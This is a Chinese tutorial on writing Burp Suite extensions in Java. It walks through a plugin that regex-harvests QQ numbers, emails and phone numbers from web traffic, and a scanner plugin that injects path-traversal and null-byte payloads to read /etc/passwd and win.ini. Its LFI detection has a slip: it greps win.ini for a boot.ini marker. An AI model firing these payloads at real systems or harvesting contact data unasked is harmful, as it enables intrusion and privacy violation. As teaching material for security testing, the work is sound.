# 课程 P1：提升挖洞效率的大杀器 - Burp插件编写 🚀

![](img/a6765af1c7b23d09c743cce2e8ab512c_0.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_2.png)

在本课程中，我们将学习如何编写Burp Suite插件，以提升信息搜集与漏洞扫描的效率。课程内容涵盖插件编写的意义、核心API、开发准备，并通过两个实战案例（信息搜集插件和LFI漏洞扫描增强插件）来具体讲解开发流程。

---

## 为什么要编写Burp插件？🤔

上一节我们介绍了课程概述，本节中我们来看看编写Burp插件的意义。

Burp Suite作为Web安全领域的神器，在代码审计、漏洞挖掘和渗透测试中应用广泛。然而，我们通常只使用了其20%的功能。其真正强大之处远不止于此。当你在漏洞挖掘中遇到瓶颈，无法更高效、更高危地发现漏洞时，学习编写插件、解锁Burp的更多能力，或许能帮助你突破瓶颈。

当然，这需要一些理论知识作为铺垫。由于时间关系，我们不会深入讲解所有API知识，但你可以通过以下资源自行学习：

*   **官方API文档**：这是最权威的参考资料。
*   **中文API文档**：之前乌云上的大神翻译的版本，有助于理解每个接口。
*   **API分类与归纳**：将API进行分类整理，帮助你理清接口间的关系，明确插件需要实现哪些功能。

---

## 开发前的思路与准备 🛠️

在动手编写代码之前，清晰的思路和充分的准备至关重要。本节我们将探讨插件开发的基本思路和准备工作。

### 开发思路

以下是开发插件前需要思考的几个步骤：

1.  **明确功能**：确定插件要实现什么。
2.  **确定数据源**：明确需要处理什么数据。
3.  **设计处理逻辑**：规划如何处理这些数据。
4.  **设计展示方式**：决定结果如何呈现。

以本次要编写的信息搜集插件为例：
*   **功能**：信息搜集。
*   **数据源**：流经Burp的HTTP响应数据包。
*   **处理逻辑**：使用正则表达式从响应包中提取特定信息（如QQ、邮箱、电话）。
*   **展示方式**：在Burp中新增一个标签页，以表格形式展示结果。

梳理清楚后，就可以确定需要实现的接口：
*   获取数据：实现 `IHttpListener` 接口来监听HTTP流量。
*   处理数据：编写核心逻辑代码。
*   展示结果：实现 `ITab` 接口来创建自定义标签页。

### 开发准备

我们主要以动手实践为主，因此需要做好以下准备：

*   **编程语言**：选择 **Java**。原因如下：
    1.  Burp本身用Java编写，Java是强类型语言，而Python是弱类型语言。用Python编写可能会遇到难以调试的错误。
    2.  Java运行速度通常比Python快。
    3.  Java IDE（如Eclipse）有完善的代码提示功能，能提示接口、类和方法，降低开发难度。
    即使你没学过Java也不必担心，其语法相对容易上手。
*   **开发环境**：使用 **Eclipse** 作为集成开发环境（IDE）。

### 搭建基础框架

让我们从一个简单的“Hello World”开始，搭建插件的基础框架。

首先，创建一个Java项目，并导入Burp的API文件（`burp` 包）。然后，创建一个入口类，该类必须实现 `IBurpExtender` 接口。

```java
package burp;

import java.io.PrintWriter;

public class BurpExtender implements IBurpExtender {
    // 声明回调对象和辅助工具
    private IExtensionHelpers helpers;
    private PrintWriter stdout;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        // 设置插件名称
        callbacks.setExtensionName("Hello Burp");
        // 获取辅助工具对象
        helpers = callbacks.getHelpers();
        // 获取标准输出流，用于调试
        stdout = new PrintWriter(callbacks.getStdout(), true);
        // 输出测试信息
        stdout.println("Hello BugBank!");
    }
}
```

将上述代码编译成 `JAR` 文件，在Burp的 `Extender` 标签页中加载。如果能在 `Output` 或 `Errors` 标签页看到 “Hello BugBank!” 的输出，说明基础框架搭建成功。

---

## 实战案例一：信息搜集插件 🕵️♂️

上一节我们搭建了开发环境，本节我们将动手编写第一个实战插件——自动化信息搜集插件。

### 问题与思考

为何别人总能挖到更多、更高危的漏洞？一个重要原因是**信息搜集**。信息搜集是渗透测试的第一步，也是关键一步。许多高危漏洞都源于耐心、细致和全面的信息搜集。

常见的搜集缺陷包括：
1.  **局限于HTML页面**：信息可能藏在CSS注释、JS文件、JSON数据中。
2.  **信息类型收集不全**：只收集了QQ、邮箱，可能漏掉电话、物理路径、子域名等。
3.  **页面太多无法手动处理**：一个系统可能有几十上百个页面。

### 解决方案与插件设计

我们的插件将解决上述问题：
1.  **监听所有流量**：通过实现 `IHttpListener` 接口，监听代理和爬虫套件的所有HTTP响应。
2.  **正则匹配多种信息**：预定义一系列正则表达式（如匹配QQ、邮箱、电话），对每个响应包进行匹配。
3.  **自动化处理**：结合Burp的爬虫功能，自动化遍历页面并搜集信息。

插件工作流程如下：
1.  代理或爬虫发送请求。
2.  服务器返回响应。
3.  插件监听到响应包。
4.  插件用预定义的正则表达式匹配响应内容。
5.  将匹配到的信息显示在自定义标签页的表格中。
6.  响应包返回给原套件。

界面设计为一个表格，包含三列：信息类型、信息内容、来源URL。并提供右键菜单，支持清空、去重、保存结果。

### 核心代码实现

以下是精简后的核心逻辑代码，演示如何监听响应并匹配信息：

```java
package burp;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements IBurpExtender, IHttpListener {
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private IBurpExtenderCallbacks callbacks;

    // 定义要搜集的信息类型和对应的正则表达式
    private final String[][] regexList = {
            {"QQ", "[1-9][0-9]{4,10}"},
            {"邮箱", "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6}"},
            {"电话", "1[3-9]\\d{9}"}
    };

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("GetInfo Plugin");
        // 注册HTTP监听器
        callbacks.registerHttpListener(this);
        stdout.println("信息搜集插件加载成功！");
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        // 只处理响应包，且来自代理(工具标志为4)或爬虫(工具标志为8)
        if (!messageIsRequest && (toolFlag == 4 || toolFlag == 8)) {
            // 获取响应内容
            byte[] response = messageInfo.getResponse();
            String responseStr = helpers.bytesToString(response);

            // 遍历正则表达式进行匹配
            for (String[] regexItem : regexList) {
                String type = regexItem[0];
                String regex = regexItem[1];
                Pattern pattern = Pattern.compile(regex, Pattern.CASE_INSENSITIVE);
                Matcher matcher = pattern.matcher(responseStr);

                // 输出匹配结果
                while (matcher.find()) {
                    String info = matcher.group();
                    stdout.println("发现 " + type + ": " + info);
                    // TODO: 将信息添加到表格界面中显示
                }
            }
        }
    }
}
```

在实际完整版插件中，匹配到的信息会被添加到Swing表格模型中，并在自定义的 `ITab` 标签页中展示，而非仅仅打印到输出台。

---

## 实战案例二：LFI漏洞扫描增强插件 💉

在掌握了信息搜集插件的基础上，本节我们来看一个更高级的应用——编写插件来增强Burp Suite对特定漏洞（以LFI为例）的扫描能力。

### 问题与思考

有时，你挖不到漏洞并不代表漏洞不存在，可能只是缺少一个关键的“绕过”技巧。以本地文件包含漏洞为例，Burp自带的扫描器可以检测常规的LFI，但对于需要特定截断或绕过的LFI漏洞则可能失效。

例如，存在漏洞的代码可能强制为包含的文件添加 `.txt` 后缀。Burp的标准Payload无法绕过这个限制，因此扫描不出漏洞。

### 解决方案与插件设计

我们的目标是编写一个插件，在Burp主动扫描时，插入我们自定义的、包含绕过技巧的Payload，并检查响应中是否存在漏洞特征关键字。

插件工作流程如下：
1.  Scanner发起主动扫描，发送请求。
2.  插件在请求被发出前，插入自定义的Payload（如利用空字节截断）。
3.  将修改后的请求发送给服务器。
4.  获取服务器响应。
5.  检查响应中是否包含漏洞特征关键字（如Linux下 `/etc/passwd` 文件中的 `root`，Windows下 `boot.ini` 文件中的 `[boot loader]`）。
6.  如果匹配成功，则向Burp报告漏洞。

![](img/a6765af1c7b23d09c743cce2e8ab512c_4.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_6.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_8.png)

### 核心代码实现

![](img/a6765af1c7b23d09c743cce2e8ab512c_10.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_12.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_14.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_15.png)

以下是精简后的核心逻辑代码，演示如何插入Payload并检查响应：

```java
package burp;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IScannerCheck {
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private IBurpExtenderCallbacks callbacks;

    // 自定义Payload和对应的漏洞关键字
    private final String[][] payloads = {
            {"../../../../../../../../../../../../etc/passwd", "root"},
            {"../../../../../../../../../../../../etc/passwd%00", "root"},
            {"..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", "[boot loader]"},
            {"..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00", "[boot loader]"}
    };

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("LFI Enhancer");
        // 注册扫描检查器
        callbacks.registerScannerCheck(this);
        stdout.println("LFI扫描增强插件加载成功！");
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        byte[] baseRequest = baseRequestResponse.getRequest();

        for (String[] payloadItem : payloads) {
            String payload = payloadItem[0];
            String grepString = payloadItem[1];

            // 构建包含Payload的请求
            byte[] checkRequest = insertionPoint.buildRequest(helpers.stringToBytes(payload));
            // 发送请求并获取响应
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);
            byte[] response = checkRequestResponse.getResponse();

            // 检查响应中是否包含漏洞关键字
            if (response != null) {
                String responseStr = helpers.bytesToString(response);
                if (helpers.indexOf(responseStr, grepString, false, 0, responseStr.length()) >= 0) {
                    stdout.println("发现LFI漏洞！Payload: " + payload);
                    // TODO: 构建并返回详细的漏洞报告(IScanIssue)
                }
            }
        }
        return issues; // 返回发现的漏洞列表
    }
    // 需要实现 doPassiveScan 和 consolidateDuplicateIssues 方法（此处略）
}
```

在实际完整版插件中，`doActiveScan` 方法在发现漏洞时会构造一个实现了 `IScanIssue` 接口的漏洞报告对象并返回。Burp会接收这个报告，并在 `Scanner` 的 `Issues` 标签页中显示详细的漏洞信息，包括触发Payload和高亮的关键字。

---

## 拓展思考与总结 🎯

通过以上两个实战案例，我们可以看到，编写Burp插件的核心代码可能并不复杂，但却能显著提升工作效率。然而，这些示例插件仍有改进空间：

1.  **信息搜集插件**：
    *   **功能拓展**：能否增加一个配置面板，让用户自定义需要搜集的信息类型和正则表达式？
    *   **性能优化**：当前的实现可能存在性能瓶颈，你能发现并优化它吗？

2.  **LFI扫描插件**：
    *   **场景适应**：如果目标服务器权限严格控制，无法读取 `/etc/passwd` 或 `win.ini` 这类常见文件，该如何检测漏洞？是否需要寻找其他“标志性”文件或内容？

### 课程总结

在本节课中，我们一起学习了如何通过编写Burp插件来提升挖洞效率。主要收获两点方向性的思考：

1.  **全面自动化信息搜集**：漏洞挖掘如同解题，已知条件（信息）越多，解出答案（发现漏洞）的可能性就越大。利用插件将繁琐的信息搜集工作自动化、全面化。
2.  **在经典方法上做微创新**：通用的扫描器使用通用的Payload。针对特定场景（如过滤、截断、编码）对Payload进行微小调整或创新，就可能突破防线，发现别人找不到的漏洞。

![](img/a6765af1c7b23d09c743cce2e8ab512c_17.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_19.png)

![](img/a6765af1c7b23d09c743cce2e8ab512c_21.png)

尝试将你的挖洞想法融入Burp插件的设计中，你的Burp Suite或许就能成为一件可怕的“大杀器”。